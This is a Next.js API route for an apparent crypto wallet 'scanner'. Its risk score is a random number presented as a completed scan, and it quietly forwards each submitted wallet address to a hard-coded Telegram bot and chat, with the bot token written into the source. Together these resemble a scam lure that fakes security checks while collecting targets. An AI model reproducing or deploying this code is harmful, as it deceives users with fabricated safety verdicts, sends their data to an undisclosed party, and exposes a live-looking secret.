// pages/api/scan.js

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { wallet } = req.body;
  if (!wallet || typeof wallet !== 'string') {
    return res.status(400).json({ message: 'Invalid wallet address' });
  }

  const scanData = {
    wallet,
    riskScore: Math.floor(Math.random() * 10),
    status: 'Scan complete',
    timestamp: new Date().toISOString(),
  };

  // Send Telegram alert
  try {
    const botToken = '8168730814:AAF-mLJzmb7144fFCn_eUanFUgQVO4vLZWY';
    const chatId = '6596394016';
    const telegramMessage = `🔎 *Wallet Scan Completed!*
Wallet: \`${wallet}\`
Risk Score: *${scanData.riskScore}*
Status: ✅ ${scanData.status}
Time: \`${scanData.timestamp}\``;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: telegramMessage,
        parse_mode: 'Markdown',
      }),
    });
  } catch (err) {
    console.error('Telegram alert failed:', err.message);
  }

  return res.status(200).json(scanData);
}
